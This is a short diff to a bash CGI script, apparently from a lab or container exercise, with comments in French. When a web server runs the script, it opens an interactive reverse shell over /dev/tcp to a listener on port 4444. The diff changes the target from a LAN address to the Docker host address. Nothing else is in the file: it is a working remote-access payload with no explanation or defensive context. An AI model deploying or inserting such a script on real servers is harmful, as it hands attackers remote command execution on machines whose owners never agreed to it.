@@ -1,8 +1,13 @@
 #!/bin/bash
 echo "Content-type: text/plain"
-echo
+echo ""
 
-LHOST="192.168.112.128"
+# IP de l'hôte Docker visible depuis le conteneur
+IP_LOCAL="172.17.0.1"
+
+# Port à utiliser
 LPORT=4444
 
-bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
+# Exécuter la commande reverse shell vers IP_LOCAL
+bash -i >& /dev/tcp/$IP_LOCAL/$LPORT 0>&1
+
